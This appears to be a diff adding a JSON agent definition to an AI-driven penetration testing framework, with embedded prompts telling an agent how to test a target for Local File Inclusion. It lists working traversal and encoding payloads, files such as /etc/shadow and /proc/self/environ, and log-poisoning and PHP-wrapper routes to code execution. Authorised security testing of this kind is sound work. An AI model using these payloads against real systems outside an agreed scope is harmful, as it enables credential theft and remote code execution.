@@ -1,0 +1,34 @@
+{
+  "schema_version": 1,
+  "id": "vulns/lfi",
+  "version": "1.0.0",
+  "title": "Local File Inclusion Specialist Agent",
+  "category": "vulns",
+  "modes": [
+    "blackbox",
+    "greybox"
+  ],
+  "cwe": [
+    "CWE-98"
+  ],
+  "owasp": [],
+  "mitre": [],
+  "preconditions": [
+    "Operator scope and runtime capability checks pass"
+  ],
+  "required_observations": [],
+  "permitted_tools": [
+    "http_get",
+    "dns_resolve",
+    "tcp_connect"
+  ],
+  "risk_class": "restricted",
+  "methodology": "# Local File Inclusion Specialist Agent\n\n## User Prompt\nYou are testing **{target}** for Local File Inclusion (LFI).\n\n**Recon Context:**\n{recon_json}\n\n**METHODOLOGY:**\n\n### 1. Identify File Parameters\n- Parameters containing file paths: `page=`, `file=`, `include=`, `template=`, `path=`, `doc=`, `view=`, `lang=`\n- Test with: `../../../../etc/passwd`\n\n### 2. Traversal Payloads\n- Basic: `../../../etc/passwd`\n- Null byte (PHP <5.3): `../../../etc/passwd%00`\n- Double encoding: `..%252f..%252f..%252fetc%252fpasswd`\n- UTF-8 encoding: `..%c0%af..%c0%af..%c0%afetc/passwd`\n- Dot truncation: `../../../etc/passwd......................` (256+ chars)\n- Wrapper: `php://filter/convert.base64-encode/resource=index.php`\n\n### 3. OS-Specific Targets\n**Linux:**\n- `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`\n- `/var/log/apache2/access.log` (for log poisoning → RCE)\n- `/proc/self/cmdline`, `/proc/self/fd/0`\n\n**Windows:**\n- `C:\\windows\\win.ini`, `C:\\windows\\system32\\drivers\\etc\\hosts`\n- `C:\\inetpub\\wwwroot\\web.config`\n\n### 4. LFI to RCE\n- Log poisoning: Inject PHP in User-Agent → include access log\n- PHP wrappers: `php://input` with POST body containing PHP code\n- `/proc/self/environ` injection via headers\n- Session file inclusion: `/tmp/sess_[PHPSESSID]`\n\n### 5. Report\n```\nFINDING:\n- Title: Local File Inclusion in [parameter] at [endpoint]\n- Severity: High\n- CWE: CWE-98\n- Endpoint: [URL]\n- Parameter: [param]\n- Payload: [exact traversal payload]\n- File Read: [which file was read]\n- Evidence: [file contents in response]\n- Impact: Source code disclosure, credential theft, RCE via log poisoning\n- Remediation: Allowlist valid files, avoid user input in file paths, chroot\n```\n\n## System Prompt\nYou are an LFI specialist. LFI is confirmed when file contents appear in the response. The classic proof is reading `/etc/passwd` and seeing `root:x:0:0:`. Path traversal without file contents shown is NOT confirmed LFI — it could be 404 or error handling. Always try multiple depths (`../` counts) and encoding variations.\n",
+  "validation_procedure": "Submit candidates referencing actual runtime receipts; harness independently replays supported proofs. Unsupported claims require review.",
+  "stopping_conditions": [
+    "Scope rejection, depleted budget, cancellation, or missing permitted capability"
+  ],
+  "output_schema": "candidate/v1",
+  "imported_from": "vulns/lfi.md",
+  "warnings": []
+}
